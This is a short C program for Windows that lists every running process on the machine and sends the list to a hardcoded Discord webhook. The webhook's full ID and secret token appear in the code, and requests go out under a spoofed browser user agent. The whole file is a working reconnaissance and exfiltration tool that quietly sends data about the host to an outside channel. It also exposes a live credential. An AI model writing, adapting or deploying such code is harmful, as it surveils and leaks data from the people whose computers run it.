#include <windows.h>
#include <string.h>
#include <stdio.h>
#include <wininet.h>
#include <tlhelp32.h>
#pragma comment(lib, "wininet.lib")

// Function to send a message to your Discord Webhook
void send_to_discord(const char* message) {
    HINTERNET hSession = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hSession) {
        HINTERNET hConnect = InternetConnectA(hSession, "discord.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (hConnect) {
            // Your Webhook path (the part after discord.com)
            const char* path = "/api/webhooks/1482700291949330676/PumwkMWs-5maNppE4gBj5E7PdPpidwoF-Wz9gTXr-8zTIvYCjG0jI3SU5tUuG3YqOeja";
            HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", path, NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
            
            if (hRequest) {
                // Formatting the message as JSON for Discord
                char json_data[2048];
                snprintf(json_data, sizeof(json_data), "{\"content\": \"%s\"}", message);
                
                const char* headers = "Content-Type: application/json";
                HttpSendRequestA(hRequest, headers, strlen(headers), json_data, strlen(json_data));
                InternetCloseHandle(hRequest);
            }
            InternetCloseHandle(hConnect);
        }
        InternetCloseHandle(hSession);
    }
}

int main(void) {
	char buffer[1900] = "Running process: \\n";
	HANDLE snapshot;
	PROCESSENTRY32 pe = {0};
	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if(snapshot == INVALID_HANDLE_VALUE) return 1;

	pe.dwSize = sizeof(PROCESSENTRY32);
	if(Process32First(snapshot, &pe)) {
		do{
			char clean[MAX_PATH * 2] = {0};
			int j = 0;

			for(int i = 0; pe.szExeFile[i]; i++){
				if(pe.szExeFile[i] == '\\' || pe.szExeFile[i] == '\"') clean[j++] = '\\';
				clean[j++] = pe.szExeFile[i];
			}
			if(strlen(buffer) + strlen(clean) + 2 < sizeof(buffer)){
				strcat(buffer, clean);
				strcat(buffer, "\\n");
			}else{
				Sleep(1000);
				//buffer full
				send_to_discord(buffer);
				strcpy(buffer, ""); //reset
				Sleep(1000);
			}
		}while(Process32Next(snapshot, &pe));
	}
	if(strlen(buffer) > 0) {
		send_to_discord(buffer);
	}
	CloseHandle(snapshot);

	return 0;
}
